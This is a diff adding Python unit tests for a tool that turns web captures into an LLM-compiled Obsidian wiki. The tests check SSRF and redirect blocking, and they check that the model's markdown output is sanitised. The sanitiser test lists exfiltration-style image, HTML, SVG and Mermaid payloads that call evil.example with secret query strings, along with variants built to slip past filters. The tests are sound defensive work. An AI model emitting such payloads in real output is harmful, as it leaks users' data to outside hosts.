@@ -138,7 +138,10 @@ class WorkerEnrich(unittest.TestCase):
             w = s.Worker(vault, enrich=False, compile_cmd=fake_llm)
             w.submit(path, cap)
             w.jobs.join()
-            self.assertIn(path.relative_to(vault).as_posix(), (vault / "wiki" / "Page.md").read_text(encoding="utf-8"))
+            prompt = (vault / "wiki" / "Page.md").read_text(encoding="utf-8")
+            self.assertIn(path.relative_to(vault).as_posix(), prompt)
+            self.assertIn("https://example.com/post", prompt)  # source content is pasted in: no file tools needed
+            self.assertIn("LLM wiki", prompt)  # and so is the vault's CLAUDE.md schema
             for bad in (".obsidian/plugins/x/main.js", "raw/evil.md", "escape.md", "wiki/.hidden.md", "wiki/script.js"):
                 self.assertFalse((vault / bad).exists(), bad)
             self.assertIn("status: compiled", path.read_text(encoding="utf-8"))
@@ -151,10 +154,92 @@ class EnrichSafety(unittest.TestCase):
             self.assertFalse(s.is_public_url(url), url)
             self.assertEqual(s.fetch_meta(url), {}, url)
 
-    def test_redirect_into_lan_is_refused(self):
+    def test_connection_to_private_peer_is_refused(self):
+        """Even if DNS said "public" earlier (rebinding) or a redirect points inward, the socket check stops it."""
+        server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(Path("."), TOKEN, None))
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        try:
+            with self.assertRaises(OSError):
+                s.PUBLIC_ONLY_OPENER.open(f"http://127.0.0.1:{server.server_port}/health", timeout=5)
+        finally:
+            server.shutdown()
+            server.server_close()
+
+    def test_platform_detection_needs_the_real_domain(self):
+        self.assertEqual(s.detect_source("https://instagram.com.evil.example/reel/x"), "web")
+        self.assertEqual(s.detect_source("https://notx.com/a"), "web")
+        self.assertEqual(s.detect_source("https://m.youtube.com/watch?v=1"), "youtube")
+        self.assertEqual(s.detect_source("https://www.threads.net/@a/post/1"), "threads")
+
+    def test_https_peer_is_checked_before_tls(self):
+        """A plain-HTTP local server can't speak TLS: getting *our* refusal (not an SSL error) proves
+        the check ran before the ClientHello was sent."""
+        server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(Path("."), TOKEN, None))
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        try:
+            conn = s.PublicHTTPSConnection("127.0.0.1", server.server_port, timeout=5)
+            with self.assertRaisesRegex(OSError, "refused non-public peer"):
+                conn.connect()
+        finally:
+            server.shutdown()
+            server.server_close()
+
+    def test_only_http_handlers_and_http_redirects(self):
+        handlers = {type(h).__name__ for h in s.PUBLIC_ONLY_OPENER.handlers}
+        self.assertFalse(handlers & {"FTPHandler", "FileHandler", "DataHandler", "CacheFTPHandler"})
         req = urllib.request.Request("https://example.com/")
-        hop = s.PublicOnlyRedirects().redirect_request(req, None, 302, "Found", {}, "http://192.168.0.1/")
-        self.assertIsNone(hop)
+        for target in ("ftp://192.168.0.1/x", "file:///etc/passwd", "data:text/plain,x"):
+            self.assertIsNone(s.HttpOnlyRedirects().redirect_request(req, None, 302, "Found", {}, target), target)
+
+    def test_model_output_cannot_auto_load_remote_content(self):
+        md = "\n".join([
+            "![x](https://evil.example/a?d=secret)",       # inline image
+            "![y][ref]",                                    # reference-style image
+            "[ref]: https://evil.example/b?d=secret",
+            '<img src="https://evil.example/c">',
+            '<svg><image href="https://evil.example/d"/></svg>',
+            '<link rel="stylesheet" href="https://evil.example/e">',
+            "![[https://evil.example/f.png]]",              # URL as an Obsidian embed
+            "<<b>img src=https://evil.example/g>",         # rebuilt by a one-pass tag strip
+            "!![x](https://evil.example/h)",               # rebuilt by replacing only one "!"
+            "![[x](https://evil.example/i)",               # slipped past a "![[" lookahead
+            "![x](//evil.example/j.png)",                  # protocol-relative
+            "!\x000\x00 ![[Local note]] [ok](https://a.b) <https://a.b>",  # forged placeholder
+        ])
+        out = s.defang_markdown(md)
+        self.assertNotIn("![", out.replace("![[Local note]]", ""))
+        self.assertNotRegex(out, r"<(?!https://a\.b>)")  # no raw HTML left, autolink kept
+        self.assertEqual(out.count("![[Local note]]"), 1)
+        self.assertIn("[ok](https://a.b)", out)
+
+    def test_mermaid_blocks_are_not_rendered(self):
+        md = '```mermaid\nA@{ img: "https://evil.example/k" }\n```\n> ~~~ Mermaid\nB\n~~~'
+        self.assertNotRegex(s.defang_markdown(md), r"(?i)mermaid")
+
+    def test_symlinked_pages_are_not_read(self):
+        with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as outside:
+            vault = Path(tmp)
+            s.ensure_vault(vault)
+            secret = Path(outside) / "secret.txt"
+            secret.write_text("TOP-SECRET", encoding="utf-8")
+            (vault / "wiki" / "Leak.md").symlink_to(secret)
+            cap, _ = s.normalize_capture({"url": "https://example.com/post"})
+            prompt, _ = s.build_compile_prompt(vault, s.write_capture(vault, cap))
+            self.assertNotIn("TOP-SECRET", prompt)
+
+    def test_pages_omitted_from_prompt_are_not_overwritten(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            vault = Path(tmp)
+            s.ensure_vault(vault)
+            big = vault / "wiki" / "Big.md"
+            big.write_text("x" * (s.WIKI_PROMPT_BUDGET + 1), encoding="utf-8")
+            cap, _ = s.normalize_capture({"url": "https://example.com/post"})
+            prompt, omitted = s.build_compile_prompt(vault, s.write_capture(vault, cap))
+            self.assertEqual(omitted, {"wiki/Big.md"})
+            reply = json.dumps({"files": [{"path": "wiki/Big.md", "content": "replaced"},
+                                          {"path": "wiki/New.md", "content": "new"}]})
+            self.assertEqual(s.apply_compile_output(vault, reply, omitted), ["wiki/New.md"])
+            self.assertEqual(len(big.read_text(encoding="utf-8")), s.WIKI_PROMPT_BUDGET + 1)
 
 
 if __name__ == "__main__":
